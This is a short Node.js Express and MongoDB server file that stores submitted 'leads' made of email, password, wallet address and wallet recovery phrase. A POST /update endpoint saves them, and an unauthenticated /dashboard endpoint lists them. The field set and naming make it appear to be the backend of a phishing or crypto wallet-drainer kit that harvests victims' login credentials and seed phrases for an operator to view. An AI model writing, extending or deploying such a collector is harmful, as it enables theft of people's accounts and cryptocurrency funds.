const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(bodyParser.json());

// OPTION 1: This tells the server to look in the root directory for files
app.use(express.static(__dirname));

// Connect to MongoDB using the URI from your environment variables
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("Connected to MongoDB successfully"))
  .catch(err => console.error("Mongo connection error:", err));

// Define Schema and specify the collection name 'leads'
const leadSchema = new mongoose.Schema({
    email: String,
    password: String,
    walletAddress: String,
    recoveryPhrase: String,
    timestamp: { type: Date, default: Date.now }
});

const Lead = mongoose.model('Lead', leadSchema, 'leads');

// Endpoint to receive data from frontend
app.post('/update', async (req, res) => {
    try {
        const lead = new Lead(req.body);
        await lead.save();
        res.status(200).send("Saved.");
    } catch (err) {
        console.error("Save error:", err);
        res.status(500).send("Error.");
    }
});

// Endpoint to serve the lead data to the dashboard
app.get('/dashboard', async (req, res) => {
    try {
        const leads = await Lead.find().sort({ timestamp: -1 });
        res.json(leads);
    } catch (err) {
        console.error("Fetch error:", err);
        res.status(500).send("Error fetching leads.");
    }
});

// This ensures if someone visits the root, it loads the dashboard.html file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
